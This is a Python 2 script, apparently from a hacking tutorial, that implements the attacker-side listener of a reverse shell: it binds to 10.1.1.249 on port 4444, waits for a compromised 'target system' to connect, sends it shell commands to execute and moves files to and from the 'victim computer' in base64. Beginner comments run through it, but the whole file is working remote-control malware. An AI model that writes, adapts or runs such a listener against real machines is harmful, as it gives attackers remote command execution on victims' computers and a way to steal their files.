#!/usr/bin/env python
#this code is used to send and receive large chunk of data and datastructures.
import socket           #library to establish connection between 2 computers using ip and the port.
import json
import base64

class Listener:
    def __init__(self,ip, port):                                              #constructor is executed automatically when ever an object is created. no need to call the "start" function explicitly.
                                                                              #every time an object is created for the class Keylogger all the arguments needs to be passed.
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        #variable to store instance of the object socket. SOCK_STREAM is given for TCP connection
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)      #Allows to re-establish the connection using the same socket even if the socket gets dropped.(predefined rule)
        listener.bind((ip,port))                                            #binding the connection to our own computer to listen to incoming connection on port 4444.(local ip is used)
        listener.listen(0)                        #number of connection that queued before establishing the connection.(0)
        print("[+] waiting for incoming connection")
        self.connection, address = listener.accept()                  #accept method accepts the connection. and returns two values, ipaddress and the connection object.
        print("[+} got a connection " + str(address) )

    def reliable_send(self,data):
        json_data = json.dumps(data)                    #"dumps" method converts all the data into json format.
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data=""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)          #appending all the data received by combining multiple (10240bits)
                return json.loads(json_data)                              #unwraps all the json object that was received and converts into normal output
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)                                        # sending the command to be executed on the target system.

        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive()                 #output of the command executed on the target system

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))           #decoding the encoded base64 before writing it to the file.
            return "[+] Download successful."

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())            #encoding the file to be uploaded to the target sytem.

    def run(self):
        while True:
            command= raw_input(">>")            #gets input from the user and returns the data input by the user in a string
            command = command.split(" ")        #splitting commands as list. to manipulate new functions depending on the commands.
            try:
               if command[0]=="upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)                #appending the file content to be sent to the victim computer.

               result = self.execute_remotely(command)          #executing normal commands given to remote machine.

               if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)    #command[1] will contain the name of the file aand can be used as path to name the file.

            except Exception:
               result = "[-] Error during command execution"

            print(result)

my_listener= Listener("10.1.1.249",4444)                                        #creating an instace of the object LISTENER class. by passing the constructor arguments.
                    #"yourip", port

my_listener.run()                                                               #starting the execution of the code.